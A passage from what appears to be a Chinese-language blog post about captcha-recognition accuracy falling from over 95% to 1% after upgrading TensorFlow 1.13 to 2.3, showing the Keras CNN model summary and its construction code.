…
666f # \u6700\u8fd1\u6211\u628aTensorFlow\u4ece 1.13 \u5347\u7ea7\u5230\u4e86 2.3 \u7248\u672c\uff0c\u7528\u6765\u8dd1\u4e4b\u524d\u7684\u4e00\u4e2a\u9a8c\u8bc1\u7801\u8bc6\u522b\u7684\u9879\u76ee\u65f6\uff0c\u53d1\u73b0 1.13 \u51c6\u786e\u7387 95% \u4ee5\u4e0a\uff0c 2.3 \u53ea\u6709 1% \u3002 \u5b8c\u6574\u4ee3\u7801\u8bf7\u53c2\u8003 Github \u3002 2. \u6a21\u578b # \u6a21\u578b\u7ed3\u6784\u5982\u4e0b\u3002 _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= input_1 (InputLayer) (None, 80, 120, 1) 0 _________________________________________________________________ conv2d (Conv2D) (None, 78, 118, 32) 320 _________________________________________________________________ conv2d_1 (Conv2D) (None, 76, 116, 32) 9248 _________________________________________________________________ batch_normalization_v1 (Batc (None, 76, 116, 32) 128 _________________________________________________________________ max_pooling2d (MaxPooling2D) (None, 38, 58, 32) 0 _________________________________________________________________ conv2d_2 (Conv2D) (None, 36, 56, 64) 18496 _________________________________________________________________ conv2d_3 (Conv2D) (None, 34, 54, 64) 36928 _________________________________________________________________ batch_normalization_v1_1 (Ba (None, 34, 54, 64) 256 _________________________________________________________________ max_pooling2d_1 (MaxPooling2 (None, 17, 27, 64) 0 _________________________________________________________________ conv2d_4 (Conv2D) (None, 15, 25, 128) 73856 _________________________________________________________________ conv2d_5 (Conv2D) (None, 13, 23, 128) 147584 _________________________________________________________________ batch_normalization_v1_2 (Ba (None, 13, 23, 128) 512 _________________________________________________________________ max_pooling2d_2 (MaxPooling2 (None, 6, 11, 128) 0 _________________________________________________________________ conv2d_6 (Conv2D) (None, 4, 9, 256) 295168 _________________________________________________________________ conv2d_7 (Conv2D) (None, 2, 7, 256) 590080 _________________________________________________________________ batch_normalization_v1_3 (Ba (None, 2, 7, 256) 1024 _________________________________________________________________ max_pooling2d_3 (MaxPooling2 (None, 1, 3, 256) 0 _________________________________________________________________ flatten (Flatten) (None, 768) 0 _________________________________________________________________ dropout (Dropout) (None, 768) 0 _________________________________________________________________ dense (Dense) (None, 248) 190712 _________________________________________________________________ reshape (Reshape) (None, 4, 62) 0 ================================================================= Total params: 1,364,312 Trainable params: 1,363,352 Non-trainable params: 960 _________________________________________________________________ \u6784\u5efa\u6a21\u578b\u7684\u4ee3\u7801\u3002 def captcha_model(): input_tensor = Input((height, width, channel)) x = input_tensor for i in range(4): x = Conv2D(32*2**i, (3,3) ,activation='relu', data_format = 'channels_last')(x) x = Conv2D(32*2**i, (3,3) ,activation='relu', data_format = 'channels_last')(x) x = BatchNormalization(axis = -1)(x) x = MaxPooling2D( (2, 2), data_format = 'channels_last')(x) x = Flatten()(x) x = Dropout(0.7)(x) x = Dense(n_len * n_class,activation = 'softmax')(x) x = Reshape([n_len , n_class])(x) model = Model(inputs = (input_tensor), outputs = x) return model model = captcha_model() model.compile(loss='categorical_cross
…
